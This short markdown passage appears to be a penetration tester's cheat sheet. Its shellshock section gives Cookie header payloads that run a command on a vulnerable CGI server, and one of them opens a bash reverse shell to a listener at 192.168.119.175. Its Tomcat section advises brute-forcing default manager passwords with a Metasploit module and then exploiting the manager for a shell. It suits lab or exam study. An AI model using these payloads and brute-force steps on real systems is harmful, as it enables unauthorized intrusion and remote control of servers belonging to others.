## mod_cgi, shellshock

If CGI scripts are running, mod_cgi is in use. This and bash is what enables the shellshock vulnerability. Try to run a bash command by adding a header with a bash function like this:

```
Cookie: () { :;}; /usr/bin/id
Cookie: () { :;}; /bin/bash -i >& /dev/tcp/192.168.119.175/443 0>&1
```

## Tomcat

If tomcat manager is exposed, try a quick brute force for default passwords with msf `/scanner/http/tomcat/tomcat_mgr_login`.

If you can get in to the manager, there's exploits to get a shell.
